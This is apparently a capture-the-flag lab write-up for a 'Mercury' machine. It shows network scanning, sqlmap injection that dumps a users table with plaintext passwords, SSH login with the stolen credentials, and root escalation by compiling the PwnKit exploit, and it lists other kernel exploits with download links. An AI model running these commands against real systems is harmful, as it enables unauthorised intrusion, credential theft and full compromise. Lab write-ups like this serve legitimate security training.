I scan my network with:
````
sudo arp-scan -I eth1 -l
````
And the we run a nmap with the IP we get from our network:
  ````
sudo nmap -sT <ip>
````
the results:
````
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

````
I also got this: http://<ip>/mercuryfacts/1/ by navigating through the website.
It looks like a query for facts to mercury. I ran sqlmap to check this:

````
sqlmap -u http://IP:8080/mercuryfacts/1 --dbs 
````
from that command I got the following result:
````
[INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury

````

Then I checked for the tables inside mercury DB

````
sqlmap -u http://IP/mercuryfacts/1 -D mercury --tables  
````
````
Database: mercury
[2 tables]
+-------+
| facts |
| users |
+-------+
````
And by dumping the content of the table users I got:
````
sqlmap -u http://10.0.3.244:8080/mercuryfacts/1 -D mercury -T users --columns
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int         |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+


````
````
sqlmap -u http://10.0.3.244:8080/mercuryfacts/1 -D mercury -T users --dump   
````
````
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+
````
Besides the users we also know that there is an ssh service open. I tried the users and passwords for ssh connection and I got into the machine with webmaster username.

From here I check the linux kernel version and vulnerabilities that might be vulnerable to; This with the help of LinPEAS:

````

Linux version 5.4.0-45-generic

[+] [CVE-2022-2586] nft_object UAF                                                                        

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
````

I decided to use Pwnkit, I cloned the repo https://github.com/ly4k/PwnKit and send the .c file with scp,
````
scp ./PwnKit.c webmaster@10.0.3.244:/home/webmaster
````
With the .c file on the machine, I proceded to compile the file.

````
 gcc -shared PwnKit.c -o Pwnkit -Wl,-e,entry -fPIC
````
From here I have a root access and just run a find to locate the root flag:
````
find / -name "*flag.txt" ````
